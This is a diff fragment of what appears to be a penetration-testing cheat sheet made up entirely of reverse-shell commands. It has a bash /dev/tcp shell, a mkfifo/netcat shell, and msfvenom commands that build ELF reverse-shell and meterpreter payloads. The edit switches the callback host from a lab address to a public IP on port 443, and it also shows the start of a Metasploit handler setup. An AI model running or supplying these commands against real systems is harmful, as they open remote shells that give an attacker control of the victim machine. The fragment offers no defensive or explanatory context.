@@ -9,8 +9,8 @@ bash -i >& /dev/tcp/192.168.49.189/443 0>&1
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.189 4444 >/tmp/f
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.189 4444 >/tmp/f" > reverse.sh
 
-msfvenom -a x64 --platform Linux -p linux/x64/shell_reverse_tcp LHOST=192.168.49.69 LPORT=4444 -f elf > timmy.elf
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.49.189 LPORT=445 -f elf > shell.elf
+msfvenom -a x64 --platform Linux -p linux/x64/shell_reverse_tcp LHOST=35.236.161.97 LPORT=443 -f elf > timmy.elf
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=35.236.161.97 LPORT=443 -f elf > timmy.elf
 
 use exploit/multi/handler
 set PAYLOAD linux/x64/meterpreter/reverse_tcp
